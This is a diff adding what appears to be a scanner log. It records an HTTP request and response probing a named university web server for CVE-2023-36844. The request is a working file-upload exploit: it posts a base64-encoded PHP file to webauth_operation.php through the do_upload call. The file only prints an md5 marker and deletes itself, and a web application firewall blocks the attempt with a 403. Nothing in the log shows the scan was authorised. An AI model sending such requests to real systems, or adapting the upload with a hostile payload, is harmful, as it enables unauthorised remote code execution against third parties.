@@ -1,0 +1,25 @@
+[CVE-2023-36844] Dumped HTTP request for https://cedrr.le.unimelb.edu.au/webauth_operation.php
+
+
+POST /webauth_operation.php HTTP/1.1
+Host: cedrr.le.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 176
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+rs=do_upload&rsargs[]=[{"fileData": "data:text/html;base64,KCc8P3BocCBlY2hvIG1kNSgnQ1ZFLTIwMjMtMzY4NDQnKTt1bmxpbmsoX19GSUxFX18pOz8+Jyk=", "fileName": "baaca.php", "csize": 56}]
+[CVE-2023-36844] Dumped HTTP response https://cedrr.le.unimelb.edu.au/webauth_operation.php
+
+HTTP/1.1 403 Forbidden
+Connection: close
+Content-Length: 831
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Set-Cookie: visid_incap_3239149=0FQdjRvKR8CyULiKBV7tCwRyk2gAAAAAQUIPAAAAAAC8vKUBN7j0beOm1qB9nwcF; expires=Thu, 06 Aug 2026 07:06:48 GMT; HttpOnly; path=/; Domain=.le.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3239149=3lhVIuCyIlbM37arov5JAwRyk2gAAAAAsDOxLR/ZOd+5j2qp0RDzYA==; path=/; Domain=.le.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 1-1018769-0 NNNY RT(1754493445202 8) q(0 0 0 -1) r(0 -1) B15(1,10037,1) U6
+
+<html style="height:100%"><head><META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW"><meta name="format-detection" content="telephone=no"><meta name="viewport" content="initial-scale=1.0"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><script src="/c-O-Scotland-Lady-Macb-Ile-And-Seyward-my-forge-" async></script></head><body style="margin:0px;height:100%"><iframe id="main-iframe" src="/_Incapsula_Resource?CWUDNSAI=23&xinfo=1-1018769-0%20NNNY%20RT%281754493445202%208%29%20q%280%200%200%20-1%29%20r%280%20-1%29%20B15%281%2c10037%2c1%29%20U6&incident_id=237000430032579424-11526249128987329&edet=15&cinfo=01000000ce0a&rpinfo=0&mth=POST" frameborder=0 width="100%" height="100%" marginheight="0px" marginwidth="0px">Request unsuccessful. Incapsula incident ID: 237000430032579424-11526249128987329</iframe></body></html>
